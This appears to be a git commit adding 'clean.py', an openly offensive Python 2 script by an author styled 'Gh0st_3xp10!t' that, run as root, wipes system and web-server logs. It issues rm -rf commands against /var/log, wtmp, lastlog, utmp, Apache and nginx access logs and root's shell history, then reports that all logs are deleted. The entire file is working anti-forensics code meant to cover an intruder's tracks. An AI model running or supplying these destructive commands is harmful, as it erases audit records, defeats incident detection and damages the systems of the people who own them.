c01ac1c2932a1b1a64ff64aca114e53add5f1df9
Gh0st3xp101t <ghostexploit@protonmail.com>
2018-06-19 15:16:34 +0200

    Add files via upload

---
+++ clean.py
@@ -0,0 +1,150 @@
+#!/usr/bin/env python3
+import os
+import sys
+#-------------------------------|
+# By Gh0st_3xp10!t              |
+#-------------------------------|
+print"            __                                "
+print"           /  |                               "
+print"   _______ $$ |  ______    ______   _______   "
+print"  /       |$$ | /      \  /      \ /       \  "
+print" /$$$$$$$/ $$ |/$$$$$$  | $$$$$$  |$$$$$$$  | "
+print" $$ |      $$ |$$    $$ | /    $$ |$$ |  $$ | "
+print" $$ \_____ $$ |$$$$$$$$/ /$$$$$$$ |$$ |  $$ | "
+print" $$       |$$ |$$       |$$    $$ |$$ |  $$ | "
+print"  $$$$$$$/ $$/  $$$$$$$/  $$$$$$$/ $$/   $$/  "
+sys.stdout.write("\033[1;36m")
+print "      =------------------------------------------------------="
+print "       |       [+] Coded by Gh0st_3xp10!t [+]     |        "
+print "      =------------------------------------------------------="
+print "\n     -== note : This script is not working if your id != root ==-"
+sys.stdout.write("\33[35m")
+print "\n      -==================[+] Starting now [+]===================-"
+sys.stdout.write("\033[1;34m")
+os.system('rm -rf /root/.ksh_history')
+print "                  Done => [ /root/.ksh_history ] "
+
+## End
+
+os.system('rm -rf /var/log/nginx/access.log')
+print "                  Done => [ /var/log/nginx/access.log ] "
+
+## End
+
+
+os.system('rm -rf /logs/agent_lo')
+print "                  Done => [ /logs/agent_lo ] "
+
+## End
+
+
+os.system('rm -rf /logs/referer_log')
+print "                  Done => [ /logs/referer_log ] "
+
+## End
+
+
+os.system('rm -rf /logs/access_log')
+print "                  Done => [ /logs/access_log ] "
+
+## End
+
+
+os.system('rm -rf /var/log/apache2')
+print "                  Done => [ /var/log/apache2 ] "
+
+## End
+
+
+os.system('rm -rf /var/log/wtmp')
+print "                  Done => [ /var/log/wtmp ] "
+
+## End
+
+
+os.system('rm -rf /var/log/lastlog')
+print "                  Done => [ /var/log/lastlog ] "
+
+## End
+
+
+os.system('rm -rf /etc/utmp')
+print "                  Done => [ /etc/utmp ] "
+
+## End
+
+
+os.system('rm -rf /etc/wtmp')
+print "                  Done => [ /etc/wtmp ] "
+
+## End
+
+
+os.system('rm -rf /var/adm')
+print "                  Done => [ /var/adm ] "
+
+## End
+
+
+os.system('rm -rf /var/log')
+print "                  Done => [ /var/log ] "
+
+## End
+
+
+os.system('rm -rf /var/logs')
+print "                  Done => [ /var/logs ] "
+
+## End
+
+
+os.system('rm -rf /var/run/utmp')
+print "                  Done => [ /var/run/utmp ] "
+
+## End
+
+
+os.system('rm -rf /var/apache/log')
+print "                  Done => [ /var/apache/log ] "
+
+## End
+
+
+os.system('rm -rf /var/apache/logs')
+print "                  Done => [ /var/apache/logs ] "
+
+## End
+
+
+os.system('rm -rf /usr/local/apache/log')
+print "                  Done => [ /usr/local/apache/log ] "
+
+## End
+
+
+os.system('rm -rf /usr/local/apache/logs')
+print "                  Done => [ /usr/local/apache/logs ] "
+
+## End
+
+
+os.system('rm -rf /r/root/.bash_logout')
+print "                  Done => [ /root/.bash_logout ] "
+
+## End
+
+
+os.system('rm -rf /root/.bash_history')
+print "                  Done => [ /root/.bash_history ] "
+
+## End
+
+
+os.system('rm -rf /tmp/logs')
+print "                  Done => [ /tmp/logs ] "
+
+## End
+sys.stdout.write("\033[1;36m")
+
+print "\n               [+] Now all log files has ben deleted !"
+os.system('exit')
